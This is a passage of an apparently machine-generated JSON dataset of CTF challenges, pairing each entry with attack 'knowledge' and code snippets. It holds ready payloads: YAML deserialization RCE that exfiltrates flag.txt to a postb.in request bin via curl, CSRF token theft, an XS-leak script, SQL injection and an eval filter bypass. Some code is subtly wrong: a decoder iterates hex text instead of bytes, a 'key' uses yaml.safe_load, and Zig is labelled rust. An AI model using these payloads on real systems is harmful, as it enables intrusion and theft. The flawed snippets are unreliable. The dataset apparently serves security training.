            "For challenges involving custom VMs or bytecode execution within a binary, reverse-engineering the bytecode handler functions can reveal the logic applied to user input or encrypted data. In scenarios where the task is to decipher an encoded string or input, understanding the operations (like rotate left (ROL) and rotate right (ROR)) used by the VM on the data is crucial. Once these operations are understood, a decoding script can be written in high-level languages like Python to simulate the VM's decoding process. Here, mapping the VM bytecode operations to actual programming constructs (e.g., shifting and bitwise operations) and applying them in reverse order if necessary, can decode the encrypted data.\n   \n   Example Python snippet for decoding based on custom VM bytecode logic:\n   ```python\n   import ctypes\n\n   srand_seed = 0x10c9\n   encoded_flag_hex = \"5F F2 16 2F ...\"\n   arr_len = len(bytes.fromhex(encoded_flag_hex.replace(\" \", \"\")))\n   \n   # Initialize srand to sync with VM's random generation\n   ctypes.cdll.msvcrt.srand(srand_seed)\n   arr = [(ctypes.cdll.msvcrt.rand() % 7) + 1 for _ in range(arr_len)]\n   \n   # Decode logic based on reversed custom VM operations\n   decoded_bytes = [((byte << (8 - arr[i])) | (byte >> arr[i])) & 0xFF for i, byte in enumerate(encoded_flag_hex)]\n   decoded_flag = bytes(decoded_bytes).decode()\n   print(decoded_flag)\n   ```\n   This script should be tailored based on the specific VM operations and sequence observed within the challenge."
        ],
        "key": "```assembly\n.text:004022BD                 cmp     [esi+VMContext.flagbuffer.sz1], 0 ;\njumptable 00402151 case 16  \n.text:004022C1                 mov     [ebp+i], 0  \n.text:004022CB                 jbe     def_402151      ; jumptable 00402151\ndefault case  \n.text:004022D1                 mov     edi, [esi+VMContext.input_vec.end]  \n.text:004022D4                 mov     edx, [esi+VMContext.randvec.end]  \n.text:004022D7                 nop     word ptr [eax+eax+00000000h]  \n.text:004022E0  \n.text:004022E0 loc_4022E0:                             ; CODE XREF:\nDecodeInstruction+30E\u2193j  \n.text:004022E0                 mov     edi, [edi-4]  \n.text:004022E3                 mov     ecx, 8  \n.text:004022E8                 mov     edx, [edx-4]  \n.text:004022EB                 mov     eax, edi  \n.text:004022ED                 sub     ecx, edx  \n.text:004022EF                 sar     eax, cl  \n.text:004022F1                 mov     ecx, edx  \n.text:004022F3                 shl     edi, cl  \n.text:004022F5                 or      eax, edi  \n.text:004022F7                 movzx   ecx, al  \n.text:004022FA                 mov     eax, [esi+VMContext.enc_input.end]  \n.text:004022FD                 mov     [ebp+var_C4], ecx  \n.text:00402303                 cmp     eax,\n[esi+VMContext.enc_input.alloc_end]  \n.text:00402306                 jz      short loc_402310  \n.text:00402308                 mov     [eax], ecx  \n.text:0040230A                 add     [esi+VMContext.enc_input.end], 4  \n.text:0040230E                 jmp     short loc_402320  \n.text:00402310 ;\n---------------------------------------------------------------------------  \n.text:00402310  \n.text:00402310 loc_402310:                             ; CODE XREF:\nDecodeInstruction+2D6\u2191j  \n.text:00402310                 lea     ecx, [ebp+var_C4]  \n.text:00402316                 push    ecx             ; int  \n.text:00402317                 push    eax             ; Src  \n.text:00402318                 lea     ecx, [esi+VMContext.enc_input]  \n.text:0040231B                 call    vector_append  \n```"
    },
    {
        "name": "YayRev",
        "write_up": "dataset/raw/YayRev.md",
        "type": "reverse",
        "competition": [
            "CyberYoddha/2020",
            "https://ctftime.org/event/1169/tasks/"
        ],
        "score": 200,
        "max_score": 900,
        "difficulty": 0.2222222222222222,
        "knowledge": [
            "When dealing with a challenge that involves cipher text manipulation where the last characters are moved to the start, and a rotation cipher (like ROT13) is applied, the steps to decrypt or reverse the process may involve first identifying the pattern of manipulation applied to the original text and then applying the inverse of the manipulation. In this scenario, if the rotation cipher is known or identified (like ROT13), the `codecs` module in Python can be utilized to decode the cipher text. This approach is universally applicable to challenges involving similar text manipulations and known rotation ciphers.\n   - Example payload to reverse ROT13 in Python: `codecs.encode('decoded_text', 'rot_13')`",
            "In scenarios where the cipher text undergoes a specific manipulation order (e.g., the last few characters of a string are relocated to the beginning of the string, and then a rotation cipher is applied), reversing the process involves reversing each step in the opposite order. This means first applying the inverse of the rotation cipher (e.g., ROT13 applied again since ROT13 is its own inverse) and then relocating the characters back to their original positions. This approach is essential for challenges where the manipulation involves multiple steps that need to be undone in reverse order to retrieve the original text.\n   - No specific payload is provided for moving characters back to their original position since it depends on the manipulation specifics (e.g., the number of characters moved). However, the technique involves string slicing and concatenation in Python to reorder the characters."
        ],
        "key": "```python\nproficuous = flag\nsaxicolous = [ord(excogitate) for excogitate in proficuous]\nebullient = (saxicolous[-5:])\nimport random\nsecond = (saxicolous[:-5])\nsesquipedalian = ''.join(map(chr, ebullient)) + ''.join(map(chr, second))\n\nvravar = ''.join([chr(permutation.islower() and ((ord(permutation) - 84) % 26) + 97\n                     or permutation.isupper() and ((ord(permutation) - 52) % 26) + 65\n                     or ord(permutation))\n                  for permutation in sesquipedalian])\n\nauspicious = []\nfor luminescent in vravar:\n    auspicious.append(luminescent)\n\nfor cupidity in range(200):\n    second = []\n    superabundant = random.choice(auspicious)\n    print(\"mac>>>[\" + str(auspicious.index(superabundant)) + \"] \" + \"== \" +\n          \"\\\"\" + superabundant + \"\\\"\" + \" and\")\n```"
    },
    {
        "name": "yellsatjavascript",
        "write_up": "dataset/raw/yellsatjavascript.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2023",
            "https://ctftime.org/event/1866/tasks/"
        ],
        "score": 364,
        "max_score": 700,
        "difficulty": 0.52,
        "knowledge": [
            "When a JavaScript challenge involves restrictions on using direct references (like \"flag\", \".\", curly braces) to access variables or properties, Base64 encoding can be used to obfuscate the restricted words. Additionally, array syntax can be utilized to access object properties or methods to bypass dot notation restrictions.\n   - Example payload: `console['log'](eval(atob('ZmxhZw==')))`, where 'ZmxhZw==' is the Base64 encoding of \"flag\".",
            "The `eval()` function can be exploited in challenges to execute arbitrary JavaScript code, provided the input can be obfuscated to bypass any input filters in place. Leveraging encoding mechanisms like Base64 and alternative property access syntaxes are key to successfully exploiting these scenarios.\n   - No specific payload example can be provided as it heavily depends on the context of the input filters."
        ],
        "key": "```javascript\nconst net = require('net');\nconst server = net.createServer((socket) => {\n    socket.on('data', (data) => {\n        let input = data.toString().trim();\n        if (input.includes('flag') || input.includes('.') || input.includes('{') || input.includes('}')) {\n            socket.write('Invalid input!\\n');\n        } else {\n            try {\n                eval(input);\n            } catch (e) {\n                socket.write('Error in execution!\\n');\n            }\n        }\n    });\n});\n\nconst flag = 'wctf{javascript_!==_java}';\nserver.listen(1337, '0.0.0.0');\n```"
    },
    {
        "name": "Yet Another Micro-story Library",
        "write_up": "dataset/raw/Yet Another Micro-story Library.md",
        "type": "web",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "When faced with input forms handling YAML in web applications, it is possible to perform a Remote Code Execution (RCE) attack by crafting specific YAML payloads that exploit the Python object serialization and deserialization. This is particularly applicable when the server-side application is built with Python and inadequately sanitizes user input. Example payload for listing directory contents:  \n```yaml\n!!python/object/apply:os.system  \n - ls  \n```",
            "Data exfiltration can be achieved via crafted payloads in applications vulnerable to YAML deserialization attacks by piping the output of the desired command to a web-based exfiltration tool such as `curl` posting to a request bin. This method is useful when direct output is not visible or when dealing with blind remote code execution vulnerabilities. Example payload for exfiltrating the contents of `flag.txt`:  \n```yaml\n!!python/object/apply:os.system  \n - cat flag.txt | curl -X POST --data-binary @- https://postb.in/1601157034473-5430747917853  \n```"
        ],
        "key": "```python\nimport yaml\n\ndef process_yaml(yaml_input):\n    data = yaml.safe_load(yaml_input)\n    # Process the data\n    return data\n\nyaml_input = \"\"\"\n!!python/object/apply:os.system\n- ls\n\"\"\"\n\nprocess_yaml(yaml_input)\n```"
    },
    {
        "name": "yeunote",
        "write_up": "dataset/raw/yeunote.md",
        "type": "The type of this challenge is **web**.",
        "competition": [
            "ViettelMates/2018",
            "https://ctftime.org/event/629/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In scenarios involving CSRF (Cross-Site Request Forgery) vulnerabilities that require a CSRF token to make POST requests, one can circumvent such protection if the CSRF token can be dynamically loaded through an externally referenced script provided by the target application. By crafting a page that includes the target's script, attackers can steal the CSRF token if same-origin policy protections can be bypassed. This approach requires manipulating `document.domain` or modifying HTTP headers to bypass referer checks, then utilizing the stolen CSRF token to perform actions on behalf of a logged-in user.  \nExample payload:  \n```html\n<meta name=\"referrer\" content=\"no-referrer\">\n<script src=\"https://target.com/csrf.js\"></script>\n<script>\nObject.defineProperty(document, 'domain', {value: \"target.com\"});\n</script>\n<form method=\"post\" action=\"https://target.com/action\">\n<input type=\"hidden\" name=\"csrf_token\" value=\"\">\n<!-- additional form fields here -->\n<input type=\"submit\" value=\"submit\">\n</form>\n<script>\n// Code to extract and set CSRF token from loaded script into the form's csrf_token field\n</script>\n```",
            "Exploiting OAuth vulnerabilities can be an indirect method to bypass authentication or authorization mechanisms. By intercepting the OAuth token and verifier after an admin or a user initiates an OAuth sequence, an attacker can forge a request that appears as coming from the authorized user, gaining access or performing actions restricted to that user. This method requires knowledge of how the application handles OAuth callbacks and may involve capturing or generating OAuth tokens through interaction with the OAuth provider's flow, then using these captured details in crafted requests to simulate a legitimate OAuth authorized action.  \nExample payload: Cannot be provided due to variability in OAuth implementations and the need for real-time interaction or token interception, which generally requires tools like Burp Suite for request manipulation and interception."
        ],
        "key": "```js  \nfunction add_csrf_token(csrf_token) {  \n   $('form').each(function () {  \n       if ($(this).attr('method').toLowerCase() == 'post') {  \n           $('<input type=\"hidden\" name=\"csrf\" value=\"' + csrf_token + '\" />').appendTo($(this));  \n       }  \n   })  \n}\n\nif (document.domain == 'yeunote.ctf.yeuchimse.com') {  \n   add_csrf_token('bdf0ae82-2284-4b7f-a0b3-26e6d291ff1f');  \n}  \n```\n\n```html  \n<form method=\"post\"\naction=\"https://yeunote.ctf.yeuchimse.com/note/add_share/3\">  \n<input name=\"emails\" value=\"[email\u00a0protected]\"/>  \n<input type=\"submit\" value=\"submit\">  \n</form>  \n```"
    },
    {
        "name": "Your Note",
        "write_up": "dataset/raw/Your Note.md",
        "type": "web",
        "competition": [
            "LINE/2021",
            "https://ctftime.org/event/1269/tasks/"
        ],
        "score": 50,
        "max_score": 499,
        "difficulty": 0.10020040080160321,
        "knowledge": [
            "When facing a web challenge that involves redirects, pay attention to how the URL is constructed and validated. Manipulating URL parameters and exploiting the behavior of URL interpretation in browsers can lead to open redirect vulnerabilities. This can be achieved by inserting control characters or specific structures such as `@` to alter the intended path, leading to arbitrary URL redirection. \n    - Example of manipulating URL for open redirect vulnerability: Sending `http://34.84.72.167/[email\u00a0protected]` to an application can make it redirect to `http://{APP_HOST}@evil.example.com` if the application concatenates user input directly to a base URL without proper validation.",
            "For web challenges involving JavaScript interaction in a browser environment, if the challenge setup allows running custom JavaScript (e.g., via an XSS attack) and the browser sandbox is configured with options like `--disable-popup-blocking`, it's possible to exploit this setup for Cross-Site Scripting (XSS) or Cross-Site Leaks (XS-Leaks). Utilizing `window.open` and manipulating `window.opener.location` can facilitate an XS-leak attack to progressively leak information such as session tokens or CSRF tokens. This technique can be especially effective in environments where normal CORS policies are not strictly enforced, or popup blockers are disabled, allowing the attacker to open new windows and manipulate their locations to probe and extract sensitive information.\n    - Example payload for executing an XS-Leak attack:\n      ```html\n      <script>\n      const url = \"http://victim.com\";  \n      const chars = \"abcdef0123456789\";  \n      const sleep = (ms) => new Promise((r) => setTimeout(r, ms));\n\n      const main = async () => {    \n        await sleep(200);    \n        let secret = \"\";\n\n        for (const c of chars) {\n          window.opener.location.href = `${url}/fake-path?secret=${secret + c}`;  \n          await sleep(500);\n          // Assume logic to determine if the guessed character is correct\n        }    \n      };  \n      main();\n      </script>\n      ```\n    - This script attempts to guess a secret one character at a time by changing the `window.opener.location` and observing the effect, which could indicate correct or incorrect guesses based on ensuing side-effects observable from the attacker's context."
        ],
        "key": "```python  \n@app.route('/login', methods=['GET', 'POST'])  \ndef login():  \n   url = request.args.get('redirect')  \n   if url:  \n       url = app.config.get('BASE_URL') + url  \n       if current_user.is_authenticated:  \n           return redirect(url)\n\n   if request.method == 'POST':  \n       # -- snip --\n\n   elif request.method == 'GET':  \n       return render_template('login.html')  \n```"
    },
    {
        "name": "Yummy Vegetables",
        "write_up": "dataset/raw/Yummy Vegetables.md",
        "type": "pwn",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": -1,
        "max_score": 550,
        "difficulty": -1,
        "knowledge": [
            "When identifying a potential SQL injection point within an application that accepts JSON data, testing for SQL injection can be executed by constructing custom HTTP requests that include SQL control characters or syntax. This technique is effective in environments or frameworks where raw SQL queries are constructed using string concatenation with user-supplied input. Example payload for testing SQL injection vulnerability: `{\"query\":\"%' OR '1'='1\"}`",
            "To enumerate the database schema (such as table names or column details) in an SQL injection scenario, especially when dealing with SQLite databases, a UNION SELECT injection can be utilized. This involves determining the number of columns in the original query using `ORDER BY` technique and then crafting a payload that uses `UNION SELECT` to extract meta-information (e.g., table names) from `sqlite_master`. This approach is applicable in scenarios where the attacker has determined that the query result structure can be manipulated and the database engine is SQLite. Example payload to enumerate database schema: `%' AND 1=0 UNION SELECT 1,name,3 FROM sqlite_master; --`"
        ],
        "key": "```js  \nconst query = `SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';`;  \n```"
    },
    {
        "name": "Yunny It",
        "write_up": "dataset/raw/Yunny It.md",
        "type": "crypto",
        "competition": [
            "ASIS/2018/Quals",
            "https://ctftime.org/event/568/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing a service leveraging AES encryption in CBC mode with an HMAC for integrity verification, an attacker can utilize known plaintext attacks if they can manipulate plaintext and observe encrypted outputs. This can be approached by encrypting controlled plaintext inputs where the plaintext incorporates part of the target data (e.g., a FLAG), and then analyzing the encrypted output to deduce information about the encrypted target data. This strategy is effective when the attacker can predetermine some parts of the plaintext, such as a known suffix or prefix that gets appended or prepended to the target data (FLAG) before encryption.\n   \n   Example approach: For ciphertext blocks that are known to encode only a part of the FLAG followed by attacker-controlled input, modify the input to influence the block cipher's output systematically. Observing how modifications to the input affect the encrypted output can reveal information about the encrypted FLAG piece by piece.",
            "In scenarios where direct access to the decryption routine is not provided or is heavily restricted, if an oracle exists that differentiates between correctly and incorrectly decrypted content (e.g., specific responses to particular decryption outcomes), this oracle can be exploited to perform chosen-ciphertext attacks. Specifically, by carefully crafting ciphertexts and observing the oracle's responses, one can deduce information about the plaintext, such as specific byte values. This technique is powerful in CBC mode if the service's response varies based on the content of decrypted messages, allowing for incremental revelation of plaintext data through byte-wise analysis and manipulation.\n\n   Example technique: Construct an encrypted payload where the last block contains only one unknown byte of the target data (e.g., the last byte of the FLAG). By varying the preceding block (which acts as the IV for the target block in CBC mode) and observing the oracle's responses, the attacker can deduce the value of the unknown byte. Repeat this process by crafting ciphertexts that position each byte of the target data at the last position of a block, systematically revealing the entire target data."
        ],
        "key": "```python\ndef decrypt2(self, enc):  \n   enc = b64decode(enc)  \n   iv = enc[:BLOCK_SIZE]  \n   cipher = AES.new(self.key, AES.MODE_CBC, iv)  \n   plain = cipher.decrypt(enc[BLOCK_SIZE:])  \n   return \"Great job :D\" if FLAG in plain else \"Catch FLAG if you can :P\"  \n```"
    },
    {
        "name": "Zeh",
        "write_up": "dataset/raw/Zeh.md",
        "type": "reverse",
        "competition": [
            "CyberSecurityRumble/2020",
            "https://ctftime.org/event/1057/tasks/"
        ],
        "score": 100,
        "max_score": 1337,
        "difficulty": 0.07479431563201197,
        "knowledge": [
            "In challenges involving manipulation of an integer's value through operations like bit shifting and XOR to achieve a specific result, symbolic execution engines like angr can be effectively used to automate the discovery of inputs that produce the desired outcome. This approach is particularly useful in scenarios where the program logic includes deterministic, albeit complex, transformations that need to be inverted or precisely matched.",
            "When dealing with programs that do not set a seed for random number generation functions such as `rand()`, these programs will produce a consistent, repeatable output on each execution. This property can be leveraged in challenges to predict or reproduce program behavior, facilitating the construction or analysis of attacks and solutions based on the predictable aspects of the program's execution flow."
        ],
        "key": "```c\n#include <stdio.h>  \n#include <stdlib.h>  \n#include \"fahne.h\"\n\nvoid main(void) {  \n   int i = rand();  \n   int k = 13;  \n   int e;  \n   int *p = &i;\n\n   printf(\"%d\\n\", i);  \n   fflush(stdout);  \n   scanf(\"%d %d\", &k, &e);\n\n   for(int i = 7; i--;)  \n       k = (*p) >> (k%3);\n\n   k = (k)^(e);\n\n   if(k == 53225)  \n       puts(Fahne);  \n   else  \n       puts(\"War wohl void!\");  \n}\n```"
    },
    {
        "name": "zer0mi",
        "write_up": "dataset/raw/zer0mi.md",
        "type": "crypto",
        "competition": [
            "0CTF/2019/Quals",
            "https://ctftime.org/event/736/tasks/"
        ],
        "score": 611,
        "max_score": 1000,
        "difficulty": 0.611,
        "knowledge": [
            "For challenges involving encryption schemes based on linear algebra and Galois Fields (GF), specifically the Matsumoto-Imai cryptosystem, the attack approach involves finding a vector space of matrices that satisfy certain polynomial equations derived from the encryption's public key and ciphertext. By converting the Galois Field elements and system equations to a format that can be handled by computer algebra systems or custom scripts, it is possible to manipulate these equations to reveal the system's private key or directly obtain the plaintext.\n    - **Condition:** This approach is applicable when dealing with encryption schemes that can be described by polynomials over a Galois Field, particularly when the public key and ciphertext can be represented by these polynomial equations.\n    - **Knowledge:** Translate the provided public key and ciphertext into a system of polynomial equations over a Galois Field. Then find the vector space satisfying these equations to either reveal the private key or decrypt the ciphertext directly.",
            "When dealing with complex mathematical encryption challenges, utilize high-level language features for rapid prototyping (e.g., Python for preliminary scripts) and switch to lower-level languages (e.g., C++) for implementing the final solver to benefit from speed optimizations. During the decryption process, pre-calculate operations (such as Galois Field multiplications) and store them in constant arrays for quick lookup to increase the efficiency of the solver.\n    - **Condition:** Effective when solving CTF challenges that require manipulating algebraic structures such as Galois Fields, where performance can be critical due to the computational complexity of the attacks.\n    - **Knowledge:** Leverage the strengths of different programming languages according to the phase of solution development: use high-level languages for concept validation and prototyping, and low-level languages for efficient execution. Pre-calculate and store repetitive operations to optimize performance.\n\n**Sample Payload Generation Guidance:** Unfortunately, generating a specific payload or code snippet without the complete context of the Galois Field operations and the specific challenge setup is unfeasible. However, the principle of translating algebraic operations into code and pre-calculating repetitive mathematical operations can be universally applied across similar challenges."
        ],
        "key": "```cpp\nfor (int i = 0; i < N; i++) {  \n   for (int j = 0; j < N; j++) {  \n       for (int a = 0; a < N; a++) {  \n           for (int b = 0; b < N; b++) {  \n               int it[3];  \n               it[0] = i;  \n               it[1] = a;  \n               it[2] = b;  \n               sort(it, it+3);  \n               int equationNum = it[0] + N * (it[1] + N * (it[2]));  \n               int nrA = i + N * j;  \n               GF var = matrixes[j][a][b];  \n               equations[equationNum][nrA] += var;  \n           }  \n       }  \n   }  \n}\n```"
    },
    {
        "name": "ZERMATT",
        "write_up": "dataset/raw/ZERMATT.md",
        "type": "misc",
        "competition": [
            "GoogleCTF/2023",
            "https://ctftime.org/event/1929/tasks/"
        ],
        "score": -1,
        "max_score": 320,
        "difficulty": -1,
        "knowledge": [
            "In reverse engineering challenges involving obfuscated scripts, various deobfuscation techniques can be applied for clarity. One common method is to decode encoded strings using functions contained within the script itself. Once identified, these functions can be reused to decrypt the encoded strings into readable text. Additionally, cleaning up the code by removing unnecessary obstructions such as convoluted logic flows or obfuscated numeric literals can significantly improve readability, aiding in understanding the script's functionality.",
            "When dealing with custom encryption or encoding within scripts, identifying and understanding the encryption or encoding routine is crucial. Often, the key to solving the challenge lies in reverse engineering these routines to decrypt or decode the concealed information. In scenarios where the routine involves simple operations such as XOR, writing custom scripts in a more familiar or versatile programming language (e.g., Python) to replicate the decryption process can be an effective strategy to retrieve hidden messages or flags. \n\nExample Python decryption payload for simple XOR encryption:\n```python\nflag_encrypted = bytearray.fromhex(\"ENCRYPTED_FLAG_HEX\")\nkey = bytearray.fromhex(\"KEY_HEX\")\n\ndecrypted_flag = \"\".join([chr(c ^ key[i % len(key)]) for i, c in enumerate(flag_encrypted)])\nprint(decrypted_flag)\n```"
        ],
        "key": "```lua\nlocal function concatString(part1, part2)  \n   local result = {};  \n   for i = 1, #part1 do table.insert(result,\nstring.char(bit32.bxor(string.byte(string.sub(part1, i, i + 1)),\nstring.byte(string.sub(part2, 1 + ((i - 1) % #part2), 1 + ((i - 1) % #part2) +\n1))) % 256)); end  \n   return table.concat(result);  \nend  \n\nfunction loadImage()  \n   local codeSegment = {};  \n   local subPrograms = {};  \n   local v58 = {};  \n   local result = {codeSegment, subPrograms, nil, v58};  \n  \n   local dataTableSize = readInt();  \n   local dataTable = {};  \n   for i = 1, dataTableSize do  \n       local valueType = readByte();  \n       local value = nil;  \n       if (valueType == 1) then  \n           value = readByte() ~= 0;  \n       elseif (valueType == 2) then  \n           value = readFloat();  \n       elseif (valueType == 3) then  \n           value = readByteArray();  \n       end  \n       dataTable[i] = value;  \n   end\n\n   result[3] = readByte();  \n   for i = 1, readInt() do  \n       local bitPackedValue = readByte();  \n       if (valueForBitRange(bitPackedValue, 1, 1) == 0) then  \n           local bits2_3 = valueForBitRange(bitPackedValue, 2, 3);  \n           local bits4_6 = valueForBitRange(bitPackedValue, 4, 6);  \n           local opcode = {readShort(), readShort(), nil, nil};   \n           if (bits2_3 == 0) then  \n               opcode[3] = readShort();  \n               opcode[4] = readShort();  \n           elseif (bits2_3 == 1) then  \n               opcode[3] = readInt();  \n           elseif (bits2_3 == 2) then  \n               opcode[3] = readInt() - 65536;  \n           elseif (bits2_3 == 3) then  \n               opcode[3] = readInt() - 65536;  \n               opcode[4] = readShort();  \n           end  \n           if (valueForBitRange(bits4_6, 1, 1) == 1) then opcode[2] = dataTable[opcode[2]]; end  \n           if (valueForBitRange(bits4_6, 2, 2) == 1) then opcode[3] = dataTable[opcode[3]]; end  \n           if (valueForBitRange(bits4_6, 3, 3) == 1) then opcode[4] = dataTable[opcode[4]]; end  \n           codeSegment[i] = opcode;  \n       end  \n   end  \n  \n   for i = 1, readInt() do subPrograms[i - 1] = loadImage(); end  \n   for i = 1, readInt() do v58[i] = readInt(); end  \n   return result;  \nend\n\nfunction run(image, stack, global)  \n   -- ...  \nend\n\nreturn run(loadImage(), {}, v29)(...);  \n```"
    },
    {
        "name": "ZigZag",
        "write_up": "dataset/raw/ZigZag.md",
        "type": "pwn",
        "competition": [
            "SPbCTF/2020/Quals",
            "https://ctftime.org/event/1188/tasks/"
        ],
        "score": 460,
        "max_score": 500,
        "difficulty": 0.92,
        "knowledge": [
            "To analyze and understand the behavior of a complex cipher such as a permutation cipher, one effective strategy is to automate the process by writing scripts that submit texts with characters in various positions to the cipher service. These scripts help identify where each character is moved in the ciphertext, based on the response. This approach is particularly useful when dealing with multiple variations of a cipher that operates differently based on the input length.\n- Example strategy: Create a Python script that loops through different positions of the alphabet in the input text, submits each version to the cipher service, and notes the position changes in the output. Adjust the script's padding and submission mechanics according to the expected input length variations of the cipher to map out its behavior efficiently.",
            "When exploiting a heap-based vulnerability, specifically in the context of a challenge where an inappropriate size check in an edit function allows for an overflow, one can achieve an arbitrary read/write primitive. This is accomplished by overwriting metadata such as the `.page` and `.alloc_cursor` fields of a structure like `BucketHeader`. This strategy could be employed to manipulate the application's memory allocation behavior, redirecting it to a controlled or interesting area of memory. This technique requires a deep understanding of the target application's memory allocation mechanisms and careful planning to ensure the overwrite leads to a beneficial outcome without crashing the application.\n- Example technique: Craft an overflow payload that nulls out the `.alloc_cursor` and `.used_count` while setting `.page` to point at a targeted memory location. This manipulation enables the next allocation to return a pointer to the specified location, granting control over what is read from or written to that area."
        ],
        "key": "```rust\npub fn edit() !void {  \n   var idx: usize = undefined;  \n   var size: usize = undefined;\n\n   try stdout.print(\"Index: \", .{});  \n   idx = try readNum();\n\n   if (idx == ERR or idx >= chunklist.len or @ptrToInt(chunklist[idx].ptr) ==\nNULL) {  \n       try stdout.print(\"Invalid index!\\n\", .{});  \n       return;  \n   }\n\n   try stdout.print(\"Size: \", .{});  \n   size = try readNum();\n\n   if (size > chunklist[idx].len and size == ERR) {  \n       try stdout.print(\"Invalid size!\\n\", .{});  \n       return;  \n   }\n\n   chunklist[idx].len = size;\n\n   try stdout.print(\"Data: \", .{});  \n   _ = try stdin.read(chunklist[idx]);  \n}\n```"
    },
    {
        "name": "Zip-Madness",
        "write_up": "dataset/raw/Zip-Madness.md",
        "type": "misc",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 175,
        "max_score": 800,
        "difficulty": 0.21875,
        "knowledge": [
            "When facing a challenge that involves sequentially accessing many files or directories based on the contents of a previously accessed file (in this scenario, zip files named numerically and requiring to choose a path based on the contents of a direction.txt file), automate the process using a script. Bash script can be used effectively for tasks involving unzipping files, reading from files, and iterating over a set of actions. An example script for such a scenario involves initializing the process by unzipping the first file, then entering a loop where the script reads the necessary direction from a file (`direction.txt` in this case) and uses it to determine the next file to unzip, continuing this process until the final file is reached.\n   Example bash script snippet: \n   ```\n   #!/bin/bash\n   unzip flag.zip  \n   for ((i=1000; i>=1; i--))  \n   do  \n       read -r direction < direction.txt  \n       unzip -o \"${i}${direction}.zip\"  \n   done  \n   ```",
            "In scenarios where iterative file manipulations are required, such as unzipping a large number of zip files in a certain order, the use of command-line options to automate repetitive prompts (like confirmation to overwrite files) can significantly streamline the process. The `-o` option with the `unzip` command in a bash script, for instance, allows for the automatic overwriting of files without manual confirmation. This approach is beneficial in reducing the manual workload and ensuring a smooth execution of the script.\n    Example usage of `-o` in the command: \n    ```\n    unzip -o \"$direct$side.zip\"\n    ```"
        ],
        "key": "```python\nimport zipfile\nimport os\n\ndef extract_zip(zip_path, extract_to):\n    with zipfile.ZipFile(zip_path, 'r') as zip_ref:\n        zip_ref.extractall(extract_to)\n\ndef read_direction(file_path):\n    with open(file_path, 'r') as file:\n        return file.read().strip()\n\ndef main():\n    current_dir = os.getcwd()\n    extract_zip('flag.zip', current_dir)\n\n    for direct in range(1000, 0, -1):\n        direction = read_direction('direction.txt')\n        zip_filename = f\"{direct}{direction}.zip\"\n        extract_zip(zip_filename, current_dir)\n\nif __name__ == \"__main__\":\n    main()\n```\n"
    },
    {
        "name": "zipzipzipzip 100",
        "write_up": "dataset/raw/zipzipzipzip 100.md",
        "type": "pwn",
        "competition": [
            "TCP1P-CTF/2023",
            "https://ctftime.org/event/2001/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When analyzing hidden content within PDF files, two approaches can significantly aid the discovery of concealed data. First, visually inspect the document for anomalies such as overlaid or hidden objects by interacting with the document, for instance, by moving images or elements around if the viewer allows. This method can reveal parts of a flag or other hidden messages. Second, directly inspect the PDF's source code or content by opening it with a text editor. Searching for anomalies or encoded data (e.g., Base64 strings) within the file can unearth embedded secrets or parts of a CTF challenge flag that are not visibly apparent when viewing the document in a standard PDF viewer.\n   \n    Example for finding Base64 encoded data: `/Creator (Base64_encoded_string)`",
            "Handling nested zip files in CTF challenges, especially those requiring password extraction and application at each level, can be efficiently approached with automation scripts. A Python script can be utilized to automate the process of sequentially opening each zip file using a password retrieved from a text file, extract the content, and then delete the processed zip file. This method is particularly effective in challenges where manual extraction is impractical due to the sheer number of nested archives.\n\n    Example for automating the extraction and deletion of nested zip files:\n    ```python\n    import os\n\n    zip_number = 25000  \n    cmd1 = \"find . -name '*.zip' -exec unzip -o -P \"  \n    cmd2 = \" {} \\; -exec rm {} \\;\"\n\n    file = open(\"password.txt\", \"r\")  \n    pswd = file.read().strip()  \n    file.close()\n\n    for i in range(1, zip_number):  \n        os.system(cmd1 + pswd + cmd2)  \n\n        file = open(\"password.txt\", \"r\")  \n        pswd = file.read().strip()  \n        file.close()  \n    ```"
        ],
        "key": "```c\n#include <stdio.h>  \n#include <stdlib.h>\n\nchar buff[20];  \nint buff2;\n\nvoid setup(){  \n\tsetvbuf(stdin, buff, _IONBF, 0);  \n\tsetvbuf(stdout, buff, _IONBF, 0);  \n\tsetvbuf(stderr, buff, _IONBF, 0);  \n}\n\nvoid flag_handler(){  \n\tFILE *f = fopen(\"flag.txt\",\"r\");  \n        if (f == NULL) {  \n        printf(\"Cannot find flag.txt!\");  \n        exit(0);  \n }  \n}\n\nvoid buffer(){  \n\tbuff2 = 0;  \n\tprintf(\"Can you get the exact value to print the flag?\\n\");  \n\tprintf(\"Input: \");  \n\tfflush(stdout);  \n\tgets(buff);  \n\tif (buff2 > 5134160) {  \n\t\tprintf(\"Too high!\\n\\n\");  \n\t} else if (buff2 == 5134160){  \n\t\tprintf(\"Congrats, You got the right value!\\n\");  \n\t \tsystem(\"cat flag.txt\");  \n\t} else {  \n\t\tprintf(\"Sad, too low! :(, maybe you can add *more* value 0_0\\n\\n\");  \n\t}  \n\tprintf(\"\\nOutput : %s, Value : %d \\n\", buff, buff2);  \n}\n\nint main(){  \n\tflag_handler();  \n\tsetup();  \n\tbuffer();  \n}  \n```"
    },
    {
        "name": "Znfl",
        "write_up": "dataset/raw/Znfl.md",
        "type": "pwn",
        "competition": [
            "FwordCTF/2020",
            "https://ctftime.org/event/1066/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing binary files that seem to employ randomness in their operations, one effective approach to understanding their behavior is to override functions like `rand()` that generate this randomness. This can be achieved using the `LD_PRELOAD` mechanism to intercept and replace random values with fixed ones, providing a controlled environment for further analysis. This technique is especially useful when the output or behavior of a binary is inconsistent across different executions due to its reliance on random values.\n   - Example payload in C for overriding `rand()` function:\n     ```C\n     int rand() {\n       return 0;\n     }\n     ```\n     Compile with: `gcc -shared -fPIC -o libunrandom.so unrandom.c`",
